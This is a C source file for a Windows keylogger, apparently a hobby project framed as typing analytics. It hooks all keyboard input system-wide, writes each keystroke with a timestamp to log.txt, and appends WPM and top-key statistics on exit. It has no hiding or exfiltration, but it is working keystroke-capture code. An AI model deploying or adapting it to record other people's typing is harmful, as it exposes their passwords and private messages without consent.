//Libraries
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>

//Global Variables
HHOOK hook; 
FILE* fw;
time_t startTime;
int keyFrequency[256] = {0};
BOOL keyIsDown[256] = {FALSE}; // tracks held state, to ignore OS auto-repeat

//exit code
void cleanExit() {
    long totalKeystrokes = 0;
    for (int i = 0; i < 256; i++) {
        totalKeystrokes += keyFrequency[i];
    }

    double secondsElapsed = difftime(time(NULL), startTime);
    double minutesElapsed = secondsElapsed / 60.0;
    double wpm = (minutesElapsed > 0) ? (totalKeystrokes / 5.0) / minutesElapsed : 0;
    double backspaceRate = (totalKeystrokes > 0)
        ? ((double)keyFrequency[VK_BACK] / totalKeystrokes) * 100.0
        : 0;

    fprintf(fw, "\n--- Session Stats ---\n");
    fprintf(fw, "Runtime: %.1f seconds\n", secondsElapsed);
    fprintf(fw, "Total keystrokes: %ld\n", totalKeystrokes);
    fprintf(fw, "WPM: %.2f\n", wpm);
    fprintf(fw, "Backspace error rate: %.2f%%\n", backspaceRate);

    //finding top 5 most pressed 
    fprintf(fw, "\nTop 5 most pressed keys:\n");
    int used[256] = {0};
    for (int rank = 0; rank < 5; rank++) {
        int max_i = -1;
        int count = 0;
        for (int i = 0; i < 256; i++) {
            if (!used[i] && keyFrequency[i] > count) {
                count = keyFrequency[i];
                max_i = i;
            }
        }
        if (max_i == -1 || count == 0) break; // fewer than 5 distinct keys pressed
        used[max_i] = 1;

        char keyName[32];
        UINT scanCode = MapVirtualKey((DWORD)max_i, MAPVK_VK_TO_VSC_EX);
        LONG lp = (LONG)((scanCode & 0xFF) << 16);
        if ((scanCode & 0xFF00) == 0xE000)
            lp |= (1 << 24);
        GetKeyNameText(lp, keyName, sizeof(keyName));

        fprintf(fw, "%d. %s - %d presses\n", rank + 1, keyName, count);
    }

    fflush(fw);

    UnhookWindowsHookEx(hook);  //remove hook
    fclose(fw);                 //close file write
    PostQuitMessage(0);         //close the GetMessage loop
}

//funciton that takes message, parses it and logs it with timestamp
void logger(DWORD input, time_t eventTime){
    BYTE keyState[256] = {0};
    if (GetAsyncKeyState(VK_SHIFT)   & 0x8000) 
        keyState[VK_SHIFT]   = 0x80;
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) 
        keyState[VK_CONTROL] = 0x80;
    if (GetAsyncKeyState(VK_MENU)    & 0x8000) 
        keyState[VK_MENU]    = 0x80;
    if (GetKeyState(VK_CAPITAL) & 0x0001) 
        keyState[VK_CAPITAL] = 0x01;
    if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000) && (input == 'E') && (GetKeyState(VK_CAPITAL) & 0x0001)){
        cleanExit();
        return;
    }

    keyFrequency[input]++;

    UINT scanCode = MapVirtualKey(input, MAPVK_VK_TO_VSC_EX); //convert the vkCode to a hardware key press scanCode

    wchar_t buffer[5] = {0};
    //takes into account the manually-built modifier state and looks for key presses such as shift
    int result = ToUnicode(input, scanCode, keyState, buffer, 4, 0); 
    
    char timestamp[32];
    struct tm *tmInfo = localtime(&eventTime);

    if(strftime(timestamp, sizeof timestamp, "%H:%M:%S - %d/%m/%y", tmInfo) == 0){
        printf("Time error");
        cleanExit();
        return;
    }

    //check if the result of the ToUnicode is a printable character or not
    if (result > 0 && buffer[0] >= 0x20) {
    fprintf(fw, "<%s> %ls\n", timestamp, buffer);
    } 
    else{
    char keyName[32];
    UINT scanCode = MapVirtualKey(input, MAPVK_VK_TO_VSC_EX);
    LONG lp = (LONG)((scanCode & 0xFF) << 16);
    if ((scanCode & 0xFF00) == 0xE000)
        lp |= (1 << 24);
    GetKeyNameText(lp, keyName, sizeof(keyName));
    fprintf(fw, "<%s> %s\n", timestamp, keyName);
    }

    fflush(fw);
}

//KeybaordProc, standard code to get a hook working
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    if (nCode >= 0){
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vk = kb->vkCode;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (!keyIsDown[vk]) { //only log once per key press
                keyIsDown[vk] = TRUE;
                time_t EventTime = time(NULL);
                logger(vk, EventTime);
            }
        } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            keyIsDown[vk] = FALSE; //key released
        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main(){
    fw = fopen("log.txt", "a"); //open log.txt to append it 
    if(!fw){
        printf("Error with log.txt");
        return 1;
    }
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0); //setting up hook
    if(!hook){
        printf("Error while establishing hook");
        return 1;
    }

    startTime = time(NULL);

    MSG msg;
    while(GetMessage(&msg ,NULL , 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}